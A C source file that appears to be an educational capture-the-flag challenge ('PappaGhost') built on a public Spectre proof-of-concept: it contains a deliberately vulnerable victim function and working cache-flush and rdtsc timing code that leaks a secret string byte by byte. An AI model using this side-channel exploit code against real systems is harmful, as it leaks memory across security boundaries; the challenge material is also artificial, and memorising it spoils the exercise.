# Note that this must be combined with the fole from the solution script to work

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

/* code from: https://github.com/chaitanyarahalkar/Spectre-PoC */

unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {
  1,
  2,
  3,
  4,
  5,
  6,
  7,
  8,
  9,
  10,
  11,
  12,
  13,
  14,
  15,
  16
};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char * secret = "The Magic Words are Sqeamish Ossifraggee";

uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

void victim_function(size_t x, size_t y) {
  if (((x+y < array1_size))) {
    if(array1[x] == y){
        temp &= array2[0];
    }
  }
}

#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */


/* THIS NEEDS TO BE CHANGED*/
#define MAX_LINES 40*128*10 
#define MAX_LINE_LENGTH 100 

void read_numbers_from_file(const char *filename, size_t x[], int num_lines) {
    FILE *file = fopen(filename, "r");
    if (file == NULL) {
        printf("Failed to open file: %s\n", filename);
        exit(1);
    }

    char line[MAX_LINE_LENGTH];
    size_t num;
    int line_counter = 0;

    while (fgets(line, MAX_LINE_LENGTH, file) != NULL) {
        line_counter++;
        if (line_counter > 45000){
          break;
        }
        if (sscanf(line, "%lu", &num) == 1) {
            x[line_counter - 1] = num;

        } else {
            printf("Failed to parse line number %d: %s", line_counter, line);
        }
    }

    fclose(file); 
}


/* Report best guess in value[0] and runner-up in value[1] */

int readMemoryByte(size_t inputs[12]) {
  static int results[256];
  int tries, i, j, k, mix_i, junk = 0;
  size_t training_x, malicious_x, x;
  register uint64_t time1, time2;
  volatile uint8_t * addr;
  int cpui[4];
  int hits = 0;
  malicious_x = inputs[0];
  for (i = 0; i < 256; i++)
    results[i] = 0;
  for (tries = 999; tries > 0; tries--) {

    /* Flush array2[256*(0..255)] from cache */
    for (i = 0; i < 256; i++)
      _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */

    for (j = 0; j < 12; j+=2) {
        x = inputs[j];
      _mm_clflush( & array1_size);
      for (volatile int z = 0; z < 500; z++) {} /* Delay (can also mfence) */
      victim_function(inputs[j], inputs[j+1]);
    }

    /* Time reads. Order is lightly mixed up to prevent stride prediction */
      // use mfence to serialize rdtsc instead of using rdtscp which doesn't work on cpus 
      _mm_mfence();
    //   time1 = __rdtscp( & junk); /* READ TIMER */
      time1 = __rdtsc(); /* READ TIMER */
      junk = * array2; /* MEMORY ACCESS TO TIME */
    //   time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
      _mm_mfence();
      time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
      if (time2 <= CACHE_HIT_THRESHOLD )
        hits++; /* cache hit - add +1 to score for this value */


  }
  if(hits > 450){
    return hits;
  }
  return 0;
}

int find_max_index(int arr[], int size) {
    int max_index = 0;
    for (int i = 1; i < size; i++) {
        if (arr[i] > arr[max_index]) {
            max_index = i;
        }
    }
    return max_index;
}

int main(int argc,
  const char * * argv) {
  size_t malicious_x = (size_t)(secret - (char * ) array1); /* default for malicious_x */
  int i, score[2], len;
  uint8_t value[2];
  size_t x[MAX_LINES];
  size_t array_to_be_passed[12];
  size_t input_var;

  for(size_t idx = 0; idx < MAX_LINES; idx++){
    x[idx] = 0;
  }
  printf("Welcome to PappaGhost\n");
  printf("In these series of assignments, you will be exploring the Spectre Vulnerability\n");
  printf("Please give the name of a file containing some lines. Lines will be passed, two at a time, to the vulnerable function. \n");
  printf("But first, here is your christmas present: %lu\n", malicious_x);
    char filename[100];
    scanf("%s", filename);


   read_numbers_from_file(filename, x, MAX_LINES);

  for (i = 0; i < sizeof(array2); i++)
    array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
  i = 0;
  len = 40;
  printf("Reading %d bytes:\n", len);
            int hits[256];

  while(--len){
        for(int tmp = 0; tmp < 256; tmp++){
          hits[tmp] = 0;
        }
    for(int num_char = 0; num_char < 128; num_char++){

        for(int arr_idx = 0; arr_idx < 12; arr_idx++){
          array_to_be_passed[arr_idx] = x[i + arr_idx];
        }

        hits[x[i + 11]] = readMemoryByte(array_to_be_passed);

        i += 12;
      }
      int best = find_max_index(hits, 256);
      printf("%c\n",  (best > 31 && best < 127 ? (char)best : '?'));
  }
   printf("\n");
  return (0);
}
